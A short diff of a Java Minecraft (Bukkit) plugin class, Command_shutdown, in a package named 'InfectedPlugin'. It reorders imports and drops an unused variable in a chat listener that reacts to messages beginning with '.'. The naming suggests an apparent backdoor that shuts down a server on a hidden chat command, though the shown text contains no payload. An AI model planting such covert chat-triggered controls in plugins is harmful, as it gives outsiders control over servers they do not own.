@@ -1,10 +1,12 @@
 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import java.io.IOException;
-import org.bukkit.event.*;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
+
 import org.CreeperCoders.InfectedPlugin.IP_Util;
 import org.CreeperCoders.InfectedPlugin.InfectedPlugin;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_shutdown implements Listener
 {
@@ -12,7 +14,6 @@ public class Command_shutdown implements Listener
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
-        boolean cancel = false;
 
         if (message.startsWith("."))
         {
